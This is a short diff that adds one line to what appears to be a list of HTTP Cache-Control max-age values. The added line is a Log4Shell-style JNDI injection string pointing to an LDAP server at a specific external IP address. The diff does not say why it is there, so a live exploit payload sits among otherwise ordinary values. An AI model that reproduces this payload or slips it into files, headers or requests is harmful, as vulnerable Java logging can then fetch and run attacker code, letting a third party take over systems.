@@ -1,3 +1,4 @@
+${jndi:ldap://185.8.172.132:1389/a}
 max-age=0
 max-age=2419200
 max-age=259200
